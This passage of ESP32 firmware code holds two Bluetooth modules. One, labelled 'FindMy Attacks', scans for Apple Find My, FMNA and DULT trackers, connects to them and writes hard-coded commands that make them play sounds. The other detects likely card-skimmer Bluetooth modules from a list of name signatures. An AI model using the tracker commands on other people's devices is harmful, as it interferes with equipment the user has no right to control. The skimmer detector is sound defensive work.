}

static const BLEUUID& airTagCharacteristic() {
  static const BLEUUID uuid("7dfc9001-7d1c-4951-86aa-8d9728f8d66c");
  return uuid;
}

static const BLEUUID& fmnaService() {
  static const BLEUUID uuid("0000fd44-0000-1000-8000-00805f9b34fb");
  return uuid;
}

static const BLEUUID& fmnaSoundCharacteristic() {
  static const BLEUUID uuid("4f860003-943b-49ef-bed4-2f730304427a");
  return uuid;
}

static const BLEUUID& dultService() {
  static const BLEUUID uuid("15190001-12f4-c226-88ed-2ac5579f2a85");
  return uuid;
}

static const BLEUUID& dultSoundCharacteristic() {
  static const BLEUUID uuid("8e0c0001-1d68-fb92-bf61-48377421680e");
  return uuid;
}

static const char* profileName(uint8_t profile) {
  switch (profile) {
    case PROFILE_AIRTAG: return "AirTag";
    case PROFILE_FMNA: return "FMNA";
    case PROFILE_DULT: return "DULT";
    default: return "FindMy";
  }
}

static bool appleFindMyAdvertisement(BLEAdvertisedDevice* device) {
  if (!device || !device->haveManufacturerData()) return false;
  for (uint8_t index = 0; index < device->getManufacturerDataCount(); ++index) {
    const std::string data = device->getManufacturerData(index);
    if (data.size() >= 4u &&
        (uint8_t)data[0] == 0x4C && (uint8_t)data[1] == 0x00 &&
        (uint8_t)data[2] == 0x12) {
      return true;
    }
  }
  return false;
}

static int findTarget(const char* address) {
  for (uint8_t index = 0; index < s_targetCount; ++index) {
    if (strcmp(s_targets[index].address, address) == 0) return index;
  }
  return -1;
}

static void upsertTarget(BLEAdvertisedDevice* device, uint8_t profile) {
  const std::string address = device->getAddress().toString();
  portENTER_CRITICAL(&s_mux);
  int index = findTarget(address.c_str());
  if (index < 0) {
    if (s_targetCount >= kMaxTargets) {
      int weakest = 0;
      for (uint8_t i = 1; i < s_targetCount; ++i) {
        if (s_targets[i].rssi < s_targets[weakest].rssi) weakest = i;
      }
      if (device->getRSSI() <= s_targets[weakest].rssi) {
        portEXIT_CRITICAL(&s_mux);
        return;
      }
      index = weakest;
    } else {
      index = s_targetCount++;
    }
    memset(&s_targets[index], 0, sizeof(Target));
    strncpy(s_targets[index].address, address.c_str(),
            sizeof(s_targets[index].address) - 1);
  }
  Target& target = s_targets[index];
  target.addressType = device->getAddressType();
  target.rssi = (int8_t)device->getRSSI();
  target.profile = profile;
  target.connectable = device->isConnectable();
  if (target.hits < UINT16_MAX) ++target.hits;
  target.lastSeen = millis();
  s_dirty = true;
  portEXIT_CRITICAL(&s_mux);
}

class FindMyCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice* device) override {
    if (!s_scanning || !device) return;
    if (appleFindMyAdvertisement(device)) {
      upsertTarget(device, PROFILE_AIRTAG);
    } else if (device->isAdvertisingService(fmnaService())) {
      upsertTarget(device, PROFILE_FMNA);
    } else if (device->isAdvertisingService(dultService())) {
      upsertTarget(device, PROFILE_DULT);
    }
  }
};

static FindMyCallbacks s_callbacks;

static void updateNavLabels() {
  setTouchNavLabels(s_scanning ? "Stop" : "Scan",
                    "Next", "Exit", "Run",
                    s_soundMode ? "Sound" : "Test");
  redrawTouchButtonBar();
}

static void drawScreen(bool full) {
  if (full) {
    bleClearBody(TFT_BLACK);
    drawStatusBar(readBatteryVoltage(), true);
  }
  Target target{};
  uint8_t count = 0;
  portENTER_CRITICAL(&s_mux);
  count = s_targetCount;
  if (count > 0) {
    if (s_selected >= count) s_selected = 0;
    target = s_targets[s_selected];
  }
  s_dirty = false;
  portEXIT_CRITICAL(&s_mux);

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  tft.fillRect(0, 42, 240, 150, TFT_BLACK);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(ORANGE, TFT_BLACK);
  tft.setCursor(10, 48);
  tft.print("FindMy Attacks");
  tft.setTextColor(s_scanning ? UI_OK : UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(10, 68);
  tft.printf("State: %s   Found: %u", s_scanning ? "Scanning" : "Stopped",
             (unsigned)count);
  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setCursor(10, 90);
  if (count == 0) {
    tft.print("No compatible tracker found");
  } else {
    tft.printf("Target %u/%u: %s", (unsigned)(s_selected + 1),
               (unsigned)count, profileName(target.profile));
    tft.setCursor(10, 108);
    tft.print(target.address);
    tft.setCursor(10, 126);
    tft.printf("RSSI %d  %s  hits %u", (int)target.rssi,
               target.connectable ? "connectable" : "not-connectable",
               (unsigned)target.hits);
  }
  tft.setTextColor(UI_WARN, TFT_BLACK);
  tft.setCursor(10, 148);
  tft.printf("Action: %s", s_soundMode ? "Play sound" : "Test connection");
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(10, 168);
  tft.print(s_result);
  updateNavLabels();
}

static void stopScan() {
  s_scanning = false;
  if (s_scan) {
    s_scan->stop();
    s_scan->setAdvertisedDeviceCallbacks(nullptr);
  }
}

static void startScan() {
  if (!ensureBleStackReady()) return;
  if (!s_scan) s_scan = BLEDevice::getScan();
  s_scan->stop();
  s_scan->setAdvertisedDeviceCallbacks(&s_callbacks, true);
  s_scan->setActiveScan(true);
  s_scan->setInterval(80);
  s_scan->setWindow(60);
  s_scan->setDuplicateFilter(false);
  s_scanning = true;
  s_scan->start(0, nullptr, false);
  strncpy(s_result, "Scanning...", sizeof(s_result) - 1);
  s_result[sizeof(s_result) - 1] = '\0';
}

static bool resolveGatt(Target& target, NimBLEClient* client,
                        NimBLERemoteCharacteristic*& characteristic,
                        const uint8_t*& command, size_t& commandLength) {
  static const uint8_t airTagCommand[] = {0xAF};
  static const uint8_t fmnaCommand[] = {0x01, 0x00, 0x03};
  static const uint8_t dultCommand[] = {0x00, 0x03};

  const BLEUUID* serviceUuid = &airTagService();
  const BLEUUID* characteristicUuid = &airTagCharacteristic();
  command = airTagCommand;
  commandLength = sizeof(airTagCommand);
  if (target.profile == PROFILE_FMNA) {
    serviceUuid = &fmnaService();
    characteristicUuid = &fmnaSoundCharacteristic();
    command = fmnaCommand;
    commandLength = sizeof(fmnaCommand);
  } else if (target.profile == PROFILE_DULT) {
    serviceUuid = &dultService();
    characteristicUuid = &dultSoundCharacteristic();
    command = dultCommand;
    commandLength = sizeof(dultCommand);
  }

  NimBLERemoteService* service = client->getService(*serviceUuid);
  if (!service) return false;
  characteristic = service->getCharacteristic(*characteristicUuid);
  return characteristic &&
         (characteristic->canWrite() || characteristic->canWriteNoResponse());
}

static void runSelectedAction() {
  Target target{};
  portENTER_CRITICAL(&s_mux);
  if (s_targetCount == 0) {
    portEXIT_CRITICAL(&s_mux);
    strncpy(s_result, "No target selected", sizeof(s_result) - 1);
    s_result[sizeof(s_result) - 1] = '\0';
    return;
  }
  if (s_selected >= s_targetCount) s_selected = 0;
  target = s_targets[s_selected];
  portEXIT_CRITICAL(&s_mux);

  stopScan();
  drawScreen(false);
  strncpy(s_result, "Connecting (8s timeout)...", sizeof(s_result) - 1);
  s_result[sizeof(s_result) - 1] = '\0';
  drawScreen(false);

  NimBLEClient* client = BLEDevice::createClient();
  bool success = false;
  if (client) {
    client->setConnectTimeout(8);
    const BLEAddress address(std::string(target.address), target.addressType);
    if (client->connect(address)) {
      NimBLERemoteCharacteristic* characteristic = nullptr;
      const uint8_t* command = nullptr;
      size_t commandLength = 0;
      if (resolveGatt(target, client, characteristic, command, commandLength)) {
        success = !s_soundMode ||
                  characteristic->writeValue(command, commandLength, true);
        strncpy(s_result,
                success ? (s_soundMode ? "Sound command acknowledged"
                                       : "Connection/GATT test passed")
                        : "GATT write failed",
                sizeof(s_result) - 1);
      } else {
        strncpy(s_result, "Compatible GATT service not found",
                sizeof(s_result) - 1);
      }
    } else {
      strncpy(s_result, "Connection failed / target asleep",
              sizeof(s_result) - 1);
    }
    s_result[sizeof(s_result) - 1] = '\0';
    if (client->isConnected()) client->disconnect();
    delay(60);
    BLEDevice::deleteClient(client);
  } else {
    strncpy(s_result, "BLE client allocation failed", sizeof(s_result) - 1);
    s_result[sizeof(s_result) - 1] = '\0';
  }

  char actionResult[sizeof(s_result)];
  strncpy(actionResult, s_result, sizeof(actionResult) - 1);
  actionResult[sizeof(actionResult) - 1] = '\0';
  delay(80);
  startScan();
  // Preserve both successful and failed diagnostics after scanning resumes.
  strncpy(s_result, actionResult, sizeof(s_result) - 1);
  s_result[sizeof(s_result) - 1] = '\0';
  s_dirty = true;
}

static void handleButtons() {
  const uint32_t now = millis();
  if ((uint32_t)(now - s_lastButtonMs) < kButtonDebounceMs) return;

  if (isButtonPressedEdge(BTN_LEFT)) {
    if (s_scanning) stopScan(); else startScan();
    s_lastButtonMs = now;
    s_dirty = true;
  } else if (isButtonPressedEdge(BTN_DOWN)) {
    portENTER_CRITICAL(&s_mux);
    if (s_targetCount > 0) s_selected = (s_selected + 1u) % s_targetCount;
    portEXIT_CRITICAL(&s_mux);
    s_lastButtonMs = now;
    s_dirty = true;
  } else if (isButtonPressedEdge(BTN_RIGHT)) {
    s_soundMode = !s_soundMode;
    s_lastButtonMs = now;
    s_dirty = true;
  } else if (isButtonPressedEdge(BTN_UP)) {
    s_lastButtonMs = now;
    runSelectedAction();
    s_dirty = true;
  }
}

void setup() {
  prepareBleFeatureEntry();
  if (!bleRequireStackOrExit()) return;
  setTouchButtonInputEnabled(true);
  setupTouchscreen();
  memset(s_targets, 0, sizeof(s_targets));
  s_targetCount = 0;
  s_selected = 0;
  s_soundMode = false;
  s_scanning = false;
  s_dirty = true;
  s_lastUiMs = 0;
  s_lastButtonMs = 0;
  s_scan = nullptr;
  strncpy(s_result, "Ready - scan for a target", sizeof(s_result) - 1);
  s_result[sizeof(s_result) - 1] = '\0';
  drawScreen(true);
  startScan();
  drawScreen(false);
}

void loop() {
  maintainTouchNavBar();
  updateStatusBar();
  if (feature_exit_requested || featureExitButtonPressed() ||
      isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }
  handleButtons();
  const uint32_t now = millis();
  if (s_scanning && s_scan && !s_scan->isScanning()) {
    s_scan->start(0, nullptr, false);
  }
  if (s_dirty || (uint32_t)(now - s_lastUiMs) >= kUiPeriodMs) {
    s_lastUiMs = now;
    drawScreen(false);
  }
  delay(5);
}

void exit() {
  stopScan();
  s_scan = nullptr;
}

}  // namespace FindMyAttacks


namespace BleSkimmer {

#define SCREEN_WIDTH 240
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 20
#define ICON_SIZE 16
#define ICON_NUM 1

static constexpr int HDR_Y = 40;
static constexpr int LIST_Y = 58;
static constexpr int ROW_H = 32;
static constexpr int MAX_HITS = 32;
static constexpr int NAME_LEN = 18;
static constexpr int LABEL_LEN = 12;
static constexpr unsigned long BTN_DEBOUNCE_MS = 220;
static constexpr unsigned long UI_MS = 250;

struct Hit {
  uint8_t mac[6];
  int8_t rssi;
  uint8_t threat;
  uint16_t hits;
  char name[NAME_LEN];
  char label[LABEL_LEN];
  bool dirty;
};

struct Signature {
  const char* needle;  // normalized (A-Z0-9 only)
  const char* label;
  uint8_t threat;
};

// Default names used on hobbyist BT/BLE serial modules commonly found in
// Bluetooth-enabled card skimmers (SparkFun/Marauder research). A hit means
// a suspicious module is nearby — not proof of a skimmer.
static const Signature s_sigs[] = {
  {"FREE2MOVE", "FREE2MOVE", 5},
  {"BTHC05", "BT-HC05", 5},
  {"BTHC06", "BT-HC06", 5},
  {"MLTBT05", "MLT-BT05", 4},
  {"BT04A", "BT04-A", 4},
  {"BTSPP", "BT-SPP", 4},
  {"CC41A", "CC41-A", 4},
  {"SPPCA", "SPP-CA", 4},
  {"LINVOR", "LINVOR", 4},
  {"HC03", "HC-03", 5},
  {"HC04", "HC-04", 5},
  {"HC05", "HC-05", 5},
  {"HC06", "HC-06", 5},
  {"HC08", "HC-08", 5},
  {"BT04", "BT-04", 4},
  {"BT05", "BT-05", 4},
  {"BT06", "BT-06", 4},
  {"BT08", "BT-08", 4},
  {"CC41", "CC41", 4},
  {"HM10", "HM-10", 3},
  {"HM11", "HM-11", 3},
  {"HM19", "HM-19", 3},
  {"AT09", "AT-09", 3},
  {"JDY08", "JDY-08", 4},
  {"JDY10", "JDY-10", 4},
  {"JDY16", "JDY-16", 4},
  {"JDY23", "JDY-23", 4},
  {"JDY31", "JDY-31", 4},
};

static int iconX[ICON_NUM] = {10};
static int iconY = STATUS_BAR_Y_OFFSET;
static bool s_uiDrawn = false;
static bool s_chromeDrawn = false;
static bool s_scanning = false;
static bool s_listDirty = true;
static unsigned long s_lastBtnMs = 0;
static unsigned long s_lastUiMs = 0;

static Hit s_hits[MAX_HITS];
static int s_hitCount = 0;
static int s_drawnCount = 0;
static int s_selected = 0;
static int s_page = 0;

static BLEScan* s_scan = nullptr;
static portMUX_TYPE s_mux = portMUX_INITIALIZER_UNLOCKED;
static volatile bool s_hasUpdates = false;

static char s_cacheFound[24] = {0};
static char s_cacheState[12] = {0};

static int listBottomY() {
  return bleContentBottom() - 2;
}

static int rowsPerPage() {
  const int h = listBottomY() - LIST_Y;
  if (h < ROW_H) {
    return 1;
  }
  return h / ROW_H;
}

static void updateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  setTouchNavLabels(s_scanning ? "Stop" : "Start",
                    "Clear",
                    "Exit",
                    "Prev",
                    "Next");
  redrawTouchButtonBar();
}

static void paintField(int x, int y, int w, char* cache, size_t cacheSz,
                       const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return;
  }
  tft.setTextFont(1);
  tft.setTextSize(1);
  int clearW = w;
  if (cache && cache[0]) {
    const int oldW = tft.textWidth(cache) + 2;
    const int newW = text[0] ? (tft.textWidth(text) + 2) : 0;
    clearW = oldW > newW ? oldW : newW;
    if (clearW > w) {
      clearW = w;
    }
  }
  tft.fillRect(x, y, clearW, 10, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(x, y);
  tft.print(text);
  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
}

static void drawChrome() {
  if (s_chromeDrawn) {
    return;
  }
  s_chromeDrawn = true;
  tft.drawFastHLine(10, HDR_Y + 12, SCREEN_WIDTH - 20, UI_LINE);
}

static void updateHeader(bool force) {
  drawChrome();
  if (force) {
    s_cacheFound[0] = '\0';
    s_cacheState[0] = '\0';
  }

  tft.setTextFont(1);
  tft.setTextSize(1);

  char found[24];
  if (s_hitCount <= 0) {
    snprintf(found, sizeof(found), "No suspects yet");
  } else if (s_hitCount == 1) {
    snprintf(found, sizeof(found), "1 suspect nearby");
  } else {
    snprintf(found, sizeof(found), "%d suspects nearby", s_hitCount);
  }
  paintField(10, HDR_Y, 150, s_cacheFound, sizeof(s_cacheFound), found,
             s_hitCount > 0 ? ORANGE : UI_DIM_TEXT);
  paintField(170, HDR_Y, 65, s_cacheState, sizeof(s_cacheState),
             s_scanning ? "Scanning" : "Stopped",
             s_scanning ? ORANGE : UI_DIM_TEXT);
}

static void paintRow(int listIndex, bool selected) {
  const int per = rowsPerPage();
  if (listIndex < 0 || listIndex >= per) {
    return;
  }
  const int absIndex = s_page * per + listIndex;
  const int y = LIST_Y + listIndex * ROW_H;
  if (y + ROW_H > listBottomY()) {
    return;
  }

  tft.fillRect(0, y, SCREEN_WIDTH, ROW_H, TFT_BLACK);
  if (absIndex >= s_hitCount) {
    return;
  }

  const Hit& h = s_hits[absIndex];
  const uint16_t titleColor = selected ? ORANGE : WHITE;
  const uint16_t detailColor = selected ? ORANGE : UI_DIM_TEXT;

  // Prefer advertised name; fall back to matched module type.
  const char* primary = h.name[0] ? h.name : (h.label[0] ? h.label : "Suspect");

  // Keep both lines on font 1 so name/MAC never overlap.
  tft.setTextFont(1);
  tft.setTextSize(1);

  tft.setTextColor(titleColor, TFT_BLACK);
  tft.setCursor(10, y + 4);
  // Leave room for RSSI on the right so long names don't collide.
  {
    char shown[17];
    strncpy(shown, primary, sizeof(shown) - 1);
    shown[sizeof(shown) - 1] = '\0';
    tft.print(shown);
  }

  char rssi[12];
  snprintf(rssi, sizeof(rssi), "%d dBm", (int)h.rssi);
  tft.setTextColor(detailColor, TFT_BLACK);
  const int rssiW = tft.textWidth(rssi);
  tft.setCursor(SCREEN_WIDTH - 10 - rssiW, y + 4);
  tft.print(rssi);

  char mac[20];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           h.mac[0], h.mac[1], h.mac[2], h.mac[3], h.mac[4], h.mac[5]);
  tft.setTextColor(detailColor, TFT_BLACK);
  tft.setCursor(10, y + 18);
  tft.print(mac);

  if (selected) {
    tft.fillRect(2, y + 2, 3, ROW_H - 4, ORANGE);
  }
}

// Update only the dBm field — avoids wiping the whole row (no flicker).
static void paintRssiOnly(int listIndex, bool selected) {
  const int per = rowsPerPage();
  if (listIndex < 0 || listIndex >= per) {
    return;
  }
  const int absIndex = s_page * per + listIndex;
  if (absIndex < 0 || absIndex >= s_hitCount) {
    return;
  }
  const int y = LIST_Y + listIndex * ROW_H;
  if (y + ROW_H > listBottomY()) {
    return;
  }

  const Hit& h = s_hits[absIndex];
  const uint16_t detailColor = selected ? ORANGE : UI_DIM_TEXT;
  char rssi[12];
  snprintf(rssi, sizeof(rssi), "%d dBm", (int)h.rssi);

  tft.setTextFont(1);
  tft.setTextSize(1);
  // Stay on the right edge so we never erase name/MAC.
  tft.fillRect(SCREEN_WIDTH - 72, y + 2, 62, 12, TFT_BLACK);
  tft.setTextColor(detailColor, TFT_BLACK);
  const int rssiW = tft.textWidth(rssi);
  tft.setCursor(SCREEN_WIDTH - 10 - rssiW, y + 4);
  tft.print(rssi);
}

static void redrawList() {
  const int per = rowsPerPage();
  const int start = s_page * per;

  if (s_hitCount <= 0) {
    const int h = listBottomY() - LIST_Y;
    if (h > 0) {
      tft.fillRect(0, LIST_Y, SCREEN_WIDTH, h, TFT_BLACK);
    }
    tft.setTextFont(1);
    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.setCursor(10, LIST_Y + 6);
    tft.print(s_scanning ? "Listening for known skimmer" : "Press Start to begin");
    tft.setCursor(10, LIST_Y + 18);
    tft.print(s_scanning ? "Bluetooth module names..." : "scanning for suspects.");
    tft.setCursor(10, LIST_Y + 36);
    tft.print("Looks for: HC-05, HM-10,");
    tft.setCursor(10, LIST_Y + 48);
    tft.print("JDY, BT-05, and similar.");
    tft.setCursor(10, LIST_Y + 66);
    tft.print("A match is a warning only,");
    tft.setCursor(10, LIST_Y + 78);
    tft.print("not proof of a skimmer.");
    s_listDirty = false;
    return;
  }

  for (int i = 0; i < per; i++) {
    paintRow(i, (start + i) == s_selected);
  }
  s_listDirty = false;
  for (int i = 0; i < s_hitCount; i++) {
    s_hits[i].dirty = false;
  }
}

static void refreshDirtyRows() {
  const int per = rowsPerPage();
  const int start = s_page * per;
  bool any = s_listDirty;
  for (int i = start; i < start + per && i < s_hitCount; i++) {
    if (s_hits[i].dirty) {
      any = true;
      break;
    }
  }
  if (!any) {
    return;
  }
  for (int i = 0; i < per; i++) {
    const int absIndex = start + i;
    if (absIndex < s_hitCount && (s_listDirty || s_hits[absIndex].dirty)) {
      paintRow(i, absIndex == s_selected);
      s_hits[absIndex].dirty = false;
    } else if (s_listDirty && absIndex >= s_hitCount) {
      paintRow(i, false);
    }
  }
  s_listDirty = false;
}

static void normalizeName(const char* in, char* out, size_t outSz) {
  size_t j = 0;
  for (size_t i = 0; in && in[i] && j + 1 < outSz; i++) {
    char c = in[i];
    if (c >= 'a' && c <= 'z') {
      c = (char)(c - 'a' + 'A');
    }
    if ((c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')) {
      out[j++] = c;
    }
  }
  out[j] = '\0';
}

static bool matchSignature(const char* rawName, char* labelOut, size_t labelSz,
                           uint8_t* threatOut) {
  if (!rawName || !rawName[0]) {
    return false;
  }
  char norm[48];
  normalizeName(rawName, norm, sizeof(norm));
  if (!norm[0]) {
    return false;
  }

  // Any JDY-xx family member.
  if (strncmp(norm, "JDY", 3) == 0 && strlen(norm) >= 3) {
    strncpy(labelOut, "JDY-*", labelSz - 1);
    labelOut[labelSz - 1] = '\0';
    *threatOut = 4;
    return true;
  }

  for (size_t i = 0; i < sizeof(s_sigs) / sizeof(s_sigs[0]); i++) {
    if (strstr(norm, s_sigs[i].needle) != nullptr) {
      strncpy(labelOut, s_sigs[i].label, labelSz - 1);
      labelOut[labelSz - 1] = '\0';
      *threatOut = s_sigs[i].threat;
      return true;
    }
  }
  return false;
}

static int findHitIndex(const uint8_t mac[6]) {
  for (int i = 0; i < s_hitCount; i++) {
    if (memcmp(s_hits[i].mac, mac, 6) == 0) {
      return i;
    }
  }
  return -1;
}

static bool upsertHit(const uint8_t mac[6], int8_t rssi, uint8_t threat,
                      const char* label, const char* name) {
  const int idx = findHitIndex(mac);
  if (idx >= 0) {
    Hit& h = s_hits[idx];
    bool soft = false;
    h.rssi = rssi;
    h.hits++;
    if (threat > h.threat) {
      h.threat = threat;
    }
    if (label && label[0] && strcmp(h.label, label) != 0) {
      strncpy(h.label, label, LABEL_LEN - 1);
      h.label[LABEL_LEN - 1] = '\0';
      h.dirty = true;
      soft = true;
    }
    if (name && name[0] && strcmp(h.name, name) != 0) {
      strncpy(h.name, name, NAME_LEN - 1);
      h.name[NAME_LEN - 1] = '\0';
      h.dirty = true;
      soft = true;
    }
    return soft;
  }

  if (s_hitCount >= MAX_HITS) {
    int weakest = 0;
    for (int i = 1; i < s_hitCount; i++) {
      if (s_hits[i].rssi < s_hits[weakest].rssi) {
        weakest = i;
      }
    }
    if (rssi < s_hits[weakest].rssi) {
      return false;
    }
    memmove(&s_hits[weakest], &s_hits[weakest + 1],
            (size_t)(s_hitCount - weakest - 1) * sizeof(Hit));
    s_hitCount--;
  }

  Hit& h = s_hits[s_hitCount++];
  memcpy(h.mac, mac, 6);
  h.rssi = rssi;
  h.threat = threat;
  h.hits = 1;
  h.label[0] = '\0';
  h.name[0] = '\0';
  if (label) {
    strncpy(h.label, label, LABEL_LEN - 1);
    h.label[LABEL_LEN - 1] = '\0';
  }
  if (name) {
    strncpy(h.name, name, NAME_LEN - 1);
    h.name[NAME_LEN - 1] = '\0';
  }
  h.dirty = true;
  s_listDirty = true;
  return true;
}

static void extractName(BLEAdvertisedDevice* device, char* out, size_t outSz) {
  out[0] = '\0';
  if (!device || outSz < 2) {
    return;
  }
  std::string n = device->getName();
  if (n.empty()) {
    n = device->getPayloadByType(0x09);
  }
  if (n.empty()) {
    n = device->getPayloadByType(0x08);
  }
  if (n.empty()) {
    return;
  }
  strncpy(out, n.c_str(), outSz - 1);
  out[outSz - 1] = '\0';
  for (char* p = out; *p; ++p) {
    const unsigned char c = (unsigned char)*p;
    if (c < 32 || c > 126) {
      *p = '?';
    }
  }
  // Trim trailing spaces/junk so name compares/refreshes cleanly.
  for (int i = (int)strlen(out) - 1; i >= 0; --i) {
    if (out[i] == ' ' || out[i] == '?') {
      out[i] = '\0';
    } else {
      break;
    }
  }
}

class AdvCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice* device) override {
    if (!s_scanning || !device) {
      return;
    }

    char name[32];
    extractName(device, name, sizeof(name));

    char label[LABEL_LEN];
    uint8_t threat = 0;
    if (!matchSignature(name, label, sizeof(label), &threat)) {
      return;
    }

    const std::string addrStr = device->getAddress().toString();
    unsigned int b0 = 0, b1 = 0, b2 = 0, b3 = 0, b4 = 0, b5 = 0;
    if (sscanf(addrStr.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
               &b0, &b1, &b2, &b3, &b4, &b5) != 6) {
      return;
    }
    const uint8_t mac[6] = {
      (uint8_t)b0, (uint8_t)b1, (uint8_t)b2,
      (uint8_t)b3, (uint8_t)b4, (uint8_t)b5
    };

    portENTER_CRITICAL(&s_mux);
    if (upsertHit(mac, (int8_t)device->getRSSI(), threat, label, name)) {
      s_hasUpdates = true;
    }
    portEXIT_CRITICAL(&s_mux);
  }
};

static AdvCallbacks s_callbacks;

static void stopScan() {
  if (s_scan) {
    s_scan->stop();
    s_scan->setAdvertisedDeviceCallbacks(nullptr);
  }
  s_scanning = false;
}

static void startScan() {
  if (!s_scan) {
    ensureBleStackReady();
    s_scan = BLEDevice::getScan();
  }
  s_scan->stop();
  s_scan->setAdvertisedDeviceCallbacks(&s_callbacks, true);
  s_scan->setActiveScan(true);
  s_scan->setInterval(100);
  s_scan->setWindow(50);
  s_scan->setDuplicateFilter(false);
  s_scanning = true;
  s_scan->start(0, nullptr, false);
}

static void clearHits() {
  portENTER_CRITICAL(&s_mux);
  s_hitCount = 0;
  s_drawnCount = 0;
  s_selected = 0;
  s_page = 0;
  s_listDirty = true;
  s_hasUpdates = true;
  portEXIT_CRITICAL(&s_mux);
}

static void clampSelection() {
  const int per = rowsPerPage();
  if (s_hitCount <= 0) {
    s_selected = 0;
    s_page = 0;
    return;
  }
  if (s_selected >= s_hitCount) {
    s_selected = s_hitCount - 1;
  }
  if (s_selected < 0) {
    s_selected = 0;
  }
  s_page = s_selected / per;
}

static void handleButtons() {
  const unsigned long now = millis();
  if (now - s_lastBtnMs < BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    if (s_scanning) {
      stopScan();
    } else {
      startScan();
    }
    updateHeader(true);
    updateNavLabels();
    s_listDirty = true;
    s_drawnCount = 0;
    redrawList();
    s_drawnCount = s_hitCount;
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_DOWN)) {
    clearHits();
    updateHeader(true);
    redrawList();
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_UP)) {
    if (s_hitCount <= 0) {
      return;
    }
    const int prev = s_selected;
    s_selected = (s_selected <= 0) ? (s_hitCount - 1) : (s_selected - 1);
    clampSelection();
    if (s_selected / rowsPerPage() != prev / rowsPerPage()) {
      s_listDirty = true;
      s_drawnCount = 0;
      redrawList();
      s_drawnCount = s_hitCount;
    } else {
      const int per = rowsPerPage();
      paintRow(prev % per, false);
      paintRow(s_selected % per, true);
    }
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_RIGHT)) {
    if (s_hitCount <= 0) {
      return;
    }
    const int prev = s_selected;
    s_selected = (s_selected + 1) % s_hitCount;
    clampSelection();
    if (s_selected / rowsPerPage() != prev / rowsPerPage()) {
      s_listDirty = true;
      s_drawnCount = 0;
      redrawList();
      s_drawnCount = s_hitCount;
    } else {
      const int per = rowsPerPage();
      paintRow(prev % per, false);
      paintRow(s_selected % per, true);
    }
    s_lastBtnMs = now;
    return;
  }
}

static void runUI() {
  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_go_back};
  if (!s_uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i]) {
        drawToolbarIcon(iconX[i], iconY, icons[i], ORANGE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    s_uiDrawn = true;
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (toolbarIconHitY(y, iconY)) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (toolbarIconHitX(x, iconX[i])) {
            feature_exit_requested = true;
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

static void teardown() {
  stopScan();
  s_scan = nullptr;
}

void bleSkimmerSetup() {
  if (!bleRequireStackOrExit()) return;
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleClearBody(TFT_BLACK);
  setupTouchscreen();

  s_uiDrawn = false;
  s_chromeDrawn = false;
  s_scanning = false;
  s_listDirty = true;
  s_hitCount = 0;
  s_drawnCount = 0;
  s_selected = 0;
  s_page = 0;
  s_hasUpdates = false;
  s_lastBtnMs = 0;
  s_lastUiMs = 0;
  s_cacheFound[0] = '\0';
  s_cacheState[0] = '\0';
  s_scan = nullptr;

  {
    BLEScan* existing = BLEDevice::getScan();
    if (existing) {
      existing->stop();
    }
  }

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();
  runUI();
  updateNavLabels();
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  updateHeader(true);
  redrawList();

  startScan();
  updateHeader(true);
  updateNavLabels();
}

void bleSkimmerLoop() {
  if (feature_exit_requested) {
    teardown();
    return;
  }
  if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    teardown();
    feature_exit_requested = true;
    return;
  }

  handleButtons();
  runUI();

  static unsigned long s_lastStatusMs = 0;
  static unsigned long s_lastRssiMs = 0;
  const unsigned long now = millis();
  if (now - s_lastStatusMs >= 1000) {
    s_lastStatusMs = now;
    updateStatusBar();
  }
  maintainTouchNavBar();

  // New suspects or name/MAC text changes.
  if (s_hasUpdates || s_listDirty) {
    bool need = false;
    bool full = false;
    int hitCount = 0;
    portENTER_CRITICAL(&s_mux);
    need = s_hasUpdates || s_listDirty;
    full = s_listDirty;
    s_hasUpdates = false;
    s_listDirty = false;
    hitCount = s_hitCount;
    portEXIT_CRITICAL(&s_mux);

    if (need) {
      clampSelection();
      if (full || hitCount != s_drawnCount) {
        updateHeader(true);
        redrawList();
        s_drawnCount = hitCount;
        s_lastRssiMs = now;
